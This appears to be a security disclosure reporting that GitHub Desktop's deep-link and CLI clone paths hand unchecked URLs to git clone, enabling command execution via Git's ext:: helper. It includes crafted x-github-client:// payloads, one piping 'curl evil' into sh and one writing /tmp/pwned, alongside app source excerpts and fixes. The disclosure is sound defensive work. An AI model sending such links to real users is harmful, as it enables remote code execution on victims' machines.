### Title
Deep-link/CLI "Clone URL" action reaches `git clone` without a transport allow-list, enabling arbitrary command execution via `ext::`-style remote helpers - (File: app/src/lib/git/clone.ts)

### Summary
GitHub Desktop registers protocol handlers (`x-github-client://`, `github-mac://`, `--protocol-launcher`, `--cli-clone`) that let a link the user clicks, or an OS-level launch argument, deliver an arbitrary string as a "clone URL" all the way to `git clone`. Git itself will execute an arbitrary shell command for a URL of the form `ext::sh -c ...` (the `ext` remote helper) as long as `protocol.ext.allow` is not `never`; by default this protocol is allowed for direct, user-initiated invocations of `git clone` (as opposed to invocations Git considers "indirect", e.g. submodule recursion). Desktop's clone path never validates or restricts the transport scheme before shelling out, so a crafted deep link/CLI argument that reaches the Clone dialog and gets confirmed by the user results in code execution under the user's account, entirely outside of any git object/content the user intended to trust.

### Finding Description
The URL flows as follows:
1. `parseAppURL()` extracts the `openRepo` path/URL directly from the incoming `x-github-client://`/`github-mac://` deep link with no scheme validation — it only special-cases `branch` and `pr` query parameters via `testForInvalidChars`, never the `url` itself. [3](#0-2) 
2. `dispatchURLAction` routes `open-repository-from-url` to `openRepositoryFromUrl`, which (when no `pr`/`branch` is given) calls `openOrCloneRepository(url)`. [4](#0-3) 
3. `openOrCloneRepository` opens the `CloneRepository` popup pre-filled with `initialURL: url`. [5](#0-4) 
4. The same unsanitized string is accepted from `--cli-clone`/`--protocol-launcher` CLI arguments as a `CLIAction` of kind `clone-url`. [6](#0-5) 
5. `updateUrl()` in the Clone dialog runs the URL only through `parseRepositoryIdentifier`/`sanitizeCloneName`, which are solely used to derive a safe *destination folder name* — they never reject or block URLs that fail to parse as a known git remote form; the raw `url` string is retained in tab state and used unmodified for cloning. [7](#0-6) 
6. When the user confirms, `resolveCloneInfo()` falls back to returning `{ url }` verbatim whenever the URL isn't resolvable through the GitHub API (which is exactly the case for a non-standard scheme like `ext::...`), and this URL is passed to `cloneImpl` → `clone()`. [8](#0-7) 
7. `clone()` only guards against the *destination path* being a sensitive directory (`isClonePathSensitive`); it performs no check on the *url* argument's scheme before running `git ... clone --recursive ... -- <url> <path>`. [9](#0-8) 

Git's `ext::` helper (and similarly the `fd::`, or a local `.git`-URL abuse of `file://`) spawns an arbitrary command supplied in the URL. Because Desktop invokes `git clone` as a direct top-level command (not as part of a recursive submodule/LFS fetch, where Git's stricter "protocol.*.allow=user vs always" indirect-invocation rules would normally kick in), the default Git protection tier for `ext` (`user`) permits it to run. None of Desktop's existing hardening — `isClonePathSensitive` (destination-path allowlist), `sanitizeCloneName` (folder-name sanitization), or the URL-scheme-based proxy check in `envForProxy` — inspects or restricts the transport/scheme of the URL itself.

### Impact Explanation
A malicious actor can craft a link such as `x-github-client://openRepo/ext::sh%20-c%20%22curl%20evil|sh%22` (or an equivalent `--cli-clone`/`--protocol-launcher` payload) and get the victim to click it or open it via a malicious website/email. Confirming the resulting "Clone" dialog executes the embedded command with the user's OS privileges — full remote code execution, independent of anything actually committed to a repository the user trusts. This matches the "attacker controls a … deep link the user clicks … and the result is code execution" impact bucket exactly.

### Likelihood Explanation
Likelihood is bounded by the fact that the user must actively click "Clone" in the resulting dialog (the URL field is visible, though it may not be obviously suspicious to a non-technical user, especially if truncated/obscured or displayed generically as "Repository URL"). No local access, prior malware, or leaked credentials are required — only clicking an external link. This is a realistic phishing/social-engineering-adjacent but still primarily technical vector (the "unnatural user step" here is a single click on a normal-looking Desktop deep link, which the app itself advertises and handles automatically via `open-url`/`--protocol-launcher`).

### Recommendation
Before passing any URL to `clone()` (from both the deep-link and CLI-action paths), validate it against an explicit allow-list of transport schemes (`https://`, `ssh://`/`git@`, `git://`) using the existing `parseRemote()` and reject/block anything that doesn't match — mirroring the "reject early" pattern already used for invalid branch names in `parseAppURL`. Additionally, pass `-c protocol.ext.allow=never -c protocol.fd.allow=never` (or a full allow-list of protocols) explicitly to every `git clone`/`fetch` invocation in `clone.ts` regardless of URL parsing, as defense in depth.

### Proof of Concept
1. Attacker crafts a link: `x-github-client://openRepo/ext::sh%20-c%20id%3E%2Ftmp%2Fpwned` (URL-encoded for `ext::sh -c "id>/tmp/pwned"`).
2. Victim, with GitHub Desktop installed, clicks the link (e.g., embedded in a webpage, chat message, or email).
3. macOS/Windows routes the custom protocol to Desktop; `app.on('open-url', ...)` / `--protocol-launcher` triggers `handleAppURL` → `parseAppURL` → `{ name: 'open-repository-from-url', url: 'ext::sh -c "id>/tmp/pwned"' }`. [10](#0-9) 
4. `dispatchURLAction` → `openRepositoryFromUrl` → `openOrCloneRepository` opens the Clone Repository dialog, Generic tab, with the URL pre-filled.
5. Victim clicks "Clone".
6. `resolveCloneInfo()` returns `{ url: 'ext::sh -c "id>/tmp/pwned"' }` unchanged (no GitHub API match), and `clone()` runs `git ... clone --recursive -- 'ext::sh -c "id>/tmp/pwned"' <path>`, executing the attacker's command via Git's `ext` transport helper.

export async function clone(
  url: string,
  path: string,
  options: CloneOptions,
  progressCallback?: (progress: ICloneProgress) => void
): Promise<void> {
  if (isClonePathSensitive(path)) {
    throw new Error(
      `The clone destination "${path}" targets a sensitive system location. ` +
        'Cloning into this directory is not allowed.'
    )
  }

  const env = {
    ...(await envForRemoteOperation(url)),
    GIT_CLONE_PROTECTION_ACTIVE: 'false',
  }

  const defaultBranch = options.defaultBranch ?? (await getDefaultBranch())

  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]

  let opts: IGitStringExecutionOptions = { env }

  if (progressCallback) {
    args.push('--progress')

    const title = `Cloning into ${path}`
    const kind = 'clone'

    opts = await executionOptionsWithProgress(
      { ...opts, trackLFSProgress: true },
      new CloneProgressParser(),
      progress => {
        const description =
          progress.kind === 'progress' ? progress.details.text : progress.text
        const value = progress.percent

        progressCallback({ kind, title, description, value })
      }
    )

    // Initial progress
    progressCallback({ kind, title, value: 0 })
  }

  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
}

async function handleCommandLineArguments(argv: string[]) {
  const args = parseCommandLineArgs(argv, {
    boolean: ['protocol-launcher'],
  })

  // Desktop registers it's protocol handler callback on Windows as
  // `[executable path] --protocol-launcher "%1"`. Note that extra command
  // line arguments might be added by Chromium
  // (https://electronjs.org/docs/api/app#event-second-instance).

  if (__WIN32__ && args['protocol-launcher'] === true) {
    // On Windows we'll end up getting called with something like
    // `--protocol-launcher --allow-file-access-from-files x-github-client://..`
    // which minimist naturally interprets as
    // `--allow-file-access-from-files=x:/github-client`. This is due to
    // Chromium's hot take on parsing command line arguments, see:
    // https://github.com/electron/electron/issues/20322#issuecomment-534137321
    // So while we could add '--allow-file...' as a boolean we can't know for
    // sure that Chromium won't add more switches later on which is why we have
    // to resort to looking through all arguments looking for something that
    // appears to be an app url.
    const prefixes = Array.from(possibleProtocols, p => `${p}://`)
    const matchingUrl = argv.find(arg => {
      if (prefixes.some(p => arg.startsWith(p))) {
        try {
          new URL(arg)
          return true
        } catch (e) {
          log.error(`Unable to parse argument as URL: ${arg}`)
        }
      }
      return false
    })

    if (matchingUrl) {
      handleAppURL(matchingUrl)
    } else {
      log.error(`Encountered --protocol-launcher without app url`)
    }
    // If --protocol-launcher is present we always want to bail and not
    // risk a smuggled cli switch
    return
  }

  if (typeof args['cli-open'] === 'string') {
    handleCLIAction({ kind: 'open-repository', path: args['cli-open'] })
  } else if (typeof args['cli-clone'] === 'string') {
    handleCLIAction({
      kind: 'clone-url',
      url: args['cli-clone'],
      branch:
        typeof args['cli-branch'] === 'string' ? args['cli-branch'] : undefined,
    })
  }
